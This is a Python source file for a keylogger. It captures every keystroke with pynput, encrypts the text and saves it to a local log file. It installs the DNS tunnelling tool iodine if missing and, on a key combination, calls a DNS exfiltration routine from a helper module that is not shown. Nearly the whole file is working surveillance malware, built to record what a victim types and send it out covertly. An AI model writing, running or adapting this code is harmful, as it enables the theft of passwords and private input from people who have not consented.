# # !#/bin/python
from pynput import keyboard
import os
import time
from encryption import encrypt_log
from dns_exfiltration import exfiltrate_via_dns
from iodine_setup import check_iodine_installed, install_iodine

string=[]
pressed_keys = set()
def on_press(key):
    pressed_keys.add(key)
    try:
        if pressed_keys.issuperset({keyboard.Key.ctrl,keyboard.Key.shift,keyboard.Key.esc}):
        # Stop listener
            save_log()
            exfiltrate_via_dns()
            return False

        elif key == keyboard.Key.backspace:
            if string:  # Ensure there is something to pop
                string.pop()
        else :
            string.append(key.char)

    except AttributeError:
        if key==keyboard.Key.space :
            string.append(' ')
        elif key==keyboard.Key.enter :
            string.append('\n')
        elif key == keyboard.Key.tab:
            string.append('\t')
        # else:
        #     string.append(str(key).replace("'", ""))

def save_log():
    if string:
        log_data = ''.join(string)
        encrypted_data = encrypt_log(log_data.encode())  # Encrypt the data
        with open("logger.txt", "ab+") as file:
            file.write(encrypted_data)

if not check_iodine_installed():
    print("Iodine is not installed. Installing...")
    install_iodine()

# Collect events until released
with keyboard.Listener(
        on_press=on_press
        ) as listener:
    listener.join()

#Hello Shivansh!